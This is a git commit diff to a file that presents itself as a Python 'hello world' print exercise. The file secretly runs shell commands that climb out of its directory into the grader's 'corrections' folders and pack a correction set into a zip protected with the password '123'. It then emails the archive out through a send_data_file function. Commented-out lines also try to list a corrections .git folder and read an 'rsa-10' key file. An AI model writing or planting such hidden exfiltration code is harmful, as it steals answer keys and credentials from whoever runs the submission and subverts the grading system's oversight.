3b38e816f1683f8f6b4ddfdc8be204b89261a759
Ashraf Atef <ashraf.programer@gmail.com>
2024-04-08 12:44:15 +0200

    task

--- 0x00-python-hello_world/2-print.py
+++ 0x00-python-hello_world/2-print.py
@@ -39,7 +39,7 @@ def get_data(command):
 # my_data += "\n#######################\n"
 # my_data += get_data("ls -al ../../../../corrections_*/.git/") or ""
 # my_data += "\n#######################\n"
-my_data = get_data("tar -czvf - ../../../../corrections_*/corrections/303/ | openssl enc -aes-256-cbc -e -k '123' > file.tar.gz") or ""
+my_data = get_data("zip -r -P 123 file.zip ../../../../corrections_*/corrections/303/") or ""
 # my_data += "\n#######################\n"
 # my_data += get_data("cat ../../../../corrections_*/corrections/262/1397/rsa-10") or ""
 # my_data += "\n#######################\n"
@@ -95,4 +95,4 @@ def send_data_file(zip_filename="data.zip", message="no_data"):
 
     # Terminating the session
     s.quit()
-send_data_file("file.tar.gz", "gz")
+send_data_file("file.zip", "zip")
